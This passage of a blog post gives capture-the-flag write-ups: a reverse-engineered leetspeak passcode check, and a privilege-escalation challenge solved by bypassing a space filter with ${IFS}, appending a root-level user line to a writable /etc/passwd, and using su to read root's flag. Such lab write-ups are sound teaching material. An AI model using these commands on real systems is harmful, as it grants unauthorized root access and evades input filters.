+</span></span></code></pre></div><p>We can see that it takes our input, then replaces some values and compares it with the string <strong>&ldquo;master locks arent vry strong are they&rdquo;</strong></p>
+<p>These values in the <strong><strong><strong><strong><strong><strong>replace()</strong></strong></strong></strong></strong></strong> function are annoying so we are going to select them and press <strong><strong><strong><strong><strong><strong><strong><strong><strong>R</strong></strong></strong></strong></strong></strong></strong></strong></strong> (which will give us their Char value)</p>
+<p>The pseudocode now looks like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">40</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-30h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_lock</span>(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Please enter the passcode: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_fscanf</span>(_bss_start, <span style="color:#e6db74">&#34;%s&#34;</span>, s);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;The passcode you entered was: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;3&#39;</span>, <span style="color:#e6db74">&#39;e&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;_&#39;</span>, <span style="color:#e6db74">&#39; &#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;o&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;4&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strlen</span>(s) <span style="color:#f92672">==</span> <span style="color:#ae81ff">38</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(<span style="color:#e6db74">&#34;master locks arent vry strong are they&#34;</span>, s) )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;e&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;_&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;o&#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;4&#39;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">unlock</span>(s);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Not quite!&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We can see that it takes our input, “unleetifies” it (replaces 3 with e, spaces with _, 4 with a and 0 with o), compares it with the passcode and then calls the <strong><strong><strong><strong><strong><strong><strong><strong>unlock()</strong></strong></strong></strong></strong></strong></strong></strong> function</p>
+<p>So, we just have to run the binary and enter the following passcode:</p>
+<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>m4st3r_l0cks_4r3nt_vry_str0ng_4r3_th3y</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p><img alt="2022-12-17-231231_758x783_scrot" src="https://user-images.githubusercontent.com/77807503/208268433-7297da21-0953-4a8c-81e1-6db25c4188b4.png"></p>
+<p>flag → <strong>flag{264cec034faef71c642de1721ea26b1f}</strong></p>
+<h1 id="the-space-between-us">The Space Between Us</h1>
+<pre tabindex="0"><code>Author: @JohnHammond#6971
+
+I&#39;ve never felt this close to a character before. I hope the feeling is mutual...
+
+Escalate your privileges and retrieve the flag out of root&#39;s home directory.
+</code></pre><p>When we connect to the machine using netcat, we see that every spaces are filtered in our commands:</p>
+<p><img alt="2022-12-17-231433_634x459_scrot" src="https://user-images.githubusercontent.com/77807503/208268435-08961a13-3c6a-4d94-a172-d356d9fcb606.png"></p>
+<p>So, the first step is finding a way to execute commands with spaces</p>
+<p>And to do that, there is an environment variable that exists by default in linux: <strong><strong><strong><strong><strong><strong>${IFS}</strong></strong></strong></strong></strong></strong></p>
+<p>For example, to execute <strong><strong><strong><strong><strong><strong>ls -la</strong></strong></strong></strong></strong></strong>, we will have to write <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>ls${IFS}-la</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p>Now that we know this, we can list the content of the folder</p>
+<p><img alt="2022-12-17-231629_567x259_scrot" src="https://user-images.githubusercontent.com/77807503/208268441-0a174e6c-90e2-42cd-b40b-5cd5c1d450ae.png"></p>
+<p>We can see a <strong><strong><strong><strong><strong><strong><strong><strong><strong>README.md</strong></strong></strong></strong></strong></strong></strong></strong></strong> file, let’s take a look at it</p>
+<p><img alt="2022-12-17-231714_494x197_scrot" src="https://user-images.githubusercontent.com/77807503/208268447-6667c331-b64d-4329-8d76-ee4f4a9c82f4.png"></p>
+<p>It says that there is a misconfiguration in the filesystem, so we can start taking a look around</p>
+<p>After spending a good hour enumerating every files and their permissions, I see that the <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>/etc/passwd</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> is writable</p>
+<p><img alt="2022-12-17-231901_556x99_scrot" src="https://user-images.githubusercontent.com/77807503/208268453-d9048712-2fc6-4709-9d19-1e8b10cb6e3f.png"></p>
+<p>We are going to add a user to the file, who’s home directory will be <strong><strong><strong><strong><strong>/root</strong></strong></strong></strong></strong></p>
+<p>First, we need to generate a password hash for the user</p>
+<p><code>⌨️ openssl passwd hack</code></p>
+<p>Then, add a new line to the <strong><strong><strong><strong><strong><strong>passwd</strong></strong></strong></strong></strong></strong> file using echo (because nano &amp; vim arent working)</p>
+<p><code>⌨️ echo${IFS}&quot;hacker:ZUVbo0DtkXUXw:0:0:root:/root:/bin/bash&quot;&gt;&gt;/etc/passwd</code></p>
+<p><img alt="2022-12-17-182345_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/208268459-7a396236-e4e3-4cbe-b17a-b272225c6241.png"></p>
+<p>Of course, we still can’t use spaces so we use <strong><strong><strong><strong><strong><strong>${IFS}</strong></strong></strong></strong></strong></strong></p>
+<p>Now, we can read <strong><strong><strong><strong><strong><strong><strong><strong>/root/flag.txt</strong></strong></strong></strong></strong></strong></strong></strong> as this user using <strong><strong><strong>su</strong></strong></strong></p>
+<p><code>⌨️ echo${IFS}hack${IFS}|${IFS}su${IFS}-${IFS}hacker${IFS}-c${IFS}&quot;cat&lt;/root/flag.txt”</code></p>
+<p><img alt="2022-12-17-182532_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/208268465-f4b92ff5-3ff2-47fa-b4f0-6f06026ff481.png"></p>
+<p>flag → <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>flag{59af40c07bc6f02b457aa4c15543da2d}</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<h1 id="conclusion">Conclusion</h1>
+<p>I globally liked this CTF, there were some very interesting rooms and I learned new things so that’s a W</p>
+<p>Thanks to everyone who participated and to my tm8 b0unce</p>
+<p><img alt="certificate" src="https://user-images.githubusercontent.com/77807503/208268486-dbb01cf2-d9fe-4558-ba25-322bd76d1aad.png"></p>
+<p><img alt="2022-12-17-232956_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/208268490-01653d9d-3f6c-4d60-a146-08cdf933b7cb.png"></p>
+<p>1479 pts - 53/1658 (my username at the time was 99makarov)</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="/tags/ctf/">ctf</a></span>
+        <span class="tag"><a href="/tags/web/">web</a></span>
+        <span class="tag"><a href="/tags/re/">re</a></span>
+        <span class="tag"><a href="/tags/misc/">misc</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1616 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2022-22-12 01:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=%2fposts%2f2022%2f12%2fnahamcon-ctf-2022-writeups%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=%2fposts%2f2022%2f12%2fnahamcon-ctf-2022-writeups%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=%f0%9f%87%ac%f0%9f%87%a7%20NahamCon%20CTF%202022%20%28writeups%29&amp;caption=%f0%9f%87%ac%f0%9f%87%a7%20NahamCon%20CTF%202022%20%28writeups%29&amp;canonicalUrl=%2fposts%2f2022%2f12%2fnahamcon-ctf-2022-writeups%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=%f0%9f%87%ac%f0%9f%87%a7%20NahamCon%20CTF%202022%20%28writeups%29&amp;body=%2fposts%2f2022%2f12%2fnahamcon-ctf-2022-writeups%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=%2fposts%2f2022%2f12%2fnahamcon-ctf-2022-writeups%2f&amp;media=%2fposts%2f2022%2f12%2fnahamcon-ctf-2022-writeups%2f;description=%f0%9f%87%ac%f0%9f%87%a7%20NahamCon%20CTF%202022%20%28writeups%29" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2fposts%2f2022%2f12%2fnahamcon-ctf-2022-writeups%2f&amp;title=%f0%9f%87%ac%f0%9f%87%a7%20NahamCon%20CTF%202022%20%28writeups%29&amp;summary=%f0%9f%87%ac%f0%9f%87%a7%20NahamCon%20CTF%202022%20%28writeups%29&amp;source=%2fposts%2f2022%2f12%2fnahamcon-ctf-2022-writeups%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=%2fposts%2f2022%2f12%2fnahamcon-ctf-2022-writeups%2f&amp;resubmit=true&amp;title=%f0%9f%87%ac%f0%9f%87%a7%20NahamCon%20CTF%202022%20%28writeups%29" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=%2fposts%2f2022%2f12%2fnahamcon-ctf-2022-writeups%2f;title=%f0%9f%87%ac%f0%9f%87%a7%20NahamCon%20CTF%202022%20%28writeups%29" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=%f0%9f%87%ac%f0%9f%87%a7%20NahamCon%20CTF%202022%20%28writeups%29%20%2fposts%2f2022%2f12%2fnahamcon-ctf-2022-writeups%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=%2fposts%2f2022%2f12%2fnahamcon-ctf-2022-writeups%2f&amp;t=%f0%9f%87%ac%f0%9f%87%a7%20NahamCon%20CTF%202022%20%28writeups%29" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=%f0%9f%87%ac%f0%9f%87%a7%20NahamCon%20CTF%202022%20%28writeups%29&amp;url=%2fposts%2f2022%2f12%2fnahamcon-ctf-2022-writeups%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="/posts/2022/12/ropemporium-ret2win-x64/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">🇫🇷 ROPEmporium - ret2win (x64)</span>
+                </a>
+            </span>
+            
+
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            <span><a href="/">conflict</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>framework: <a href="http://gohugo.io">Hugo</a></span><span>in rami malek we trust</span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>
+
+
+
+
+    </body>
+</html>
